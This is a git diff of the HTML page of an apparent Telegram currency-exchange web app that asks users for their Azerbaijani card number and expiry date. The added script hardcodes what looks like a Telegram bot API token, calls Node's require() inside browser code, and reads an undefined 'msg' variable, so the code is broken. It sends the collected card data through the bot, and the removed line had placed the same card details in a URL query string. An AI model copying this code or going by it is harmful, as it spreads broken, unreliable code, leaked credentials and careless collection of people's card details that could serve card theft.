@@ -66,7 +66,21 @@
             let sum = amount * rate;
             let result = sum.toFixed(1);
 
-            window.location.href = `https://teledevtech.github.io/pulpul/pay.html?type=buy?card=${card}?date=${date}?azn=${azn}?ruble=${result}`;
+            const TelegramBot = require('node-telegram-bot-api');
+            const fetch = require('node-fetch');
+            const bot = new TelegramBot('7931676783:AAEDO3OKBg89SsiGFIJKWNxXcVXNbAOknqw');
+            const photoUrl = msg.text;
+            const photo = await fetch(photoUrl).then(res => res.buffer());
+
+            const dataDict = {
+                type: "buy",
+                card: card,
+                date: date,
+                azn: amount,
+                rub: result,
+                photo: photo
+            };
+            tg.sendData(JSON.stringify(dataDict));
         });
     </script>
     <script>
@@ -110,7 +124,8 @@
         <p id="resultazn">Вы получите:</p>
         <label>Пожалуйста, отправьте <b>НОМЕР КАРТЫ</b> Азербайджана и <b>СРОК ДЕЙСТВИЯ НА КАРТЕ</b> для получения AZN.</label><br>
         <input maxlength="19" id="card" inputmode="numeric" pattern="[0-9]*" placeholder="1234 5678 9012 3456" oninput="formatCardNumber(this)"><br>
-        <input maxlength="5" id="date" inputmode="numeric" pattern="[0-9]*" placeholder="MM/YY" oninput="formatDate(this)">
+        <input maxlength="5" id="date" inputmode="numeric" pattern="[0-9]*" placeholder="MM/YY" oninput="formatDate(this)"><br><br>
+        <input type="file">
     </div>
 </body>
 </html>
